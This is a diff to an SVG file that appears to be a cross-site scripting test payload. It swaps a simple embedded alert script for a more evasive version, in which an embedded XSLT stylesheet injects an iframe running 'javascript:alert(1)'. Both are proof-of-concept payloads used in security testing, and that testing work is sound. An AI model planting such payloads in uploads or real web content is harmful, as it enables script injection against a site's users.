@@ -1,7 +1,17 @@
-<?xml version="1.0" standalone="no"?>
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-<script type="text/javascript">
-alert('This app is probably vulnerable to XSS attacks!');
-</script>
-</svg>
+<?xml version="1.0"?>
+  <?xml-stylesheet type="text/xml" href="#stylesheet"?>
+  <!DOCTYPE doc [
+  <!ATTLIST xsl:stylesheet
+id ID #REQUIRED> ]>
+  <svg xmlns="http://www.w3.org/2000/svg">
+      <xsl:stylesheet id="stylesheet" version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+         <xsl:template match="/">
+            <iframe
+               xmlns="http://www.w3.org/1999/xhtml"
+            src="javascript:alert(1)">
+            </iframe>
+         </xsl:template>
+      </xsl:stylesheet>
+      <circle fill="red" r="40"></circle>
+   </svg>
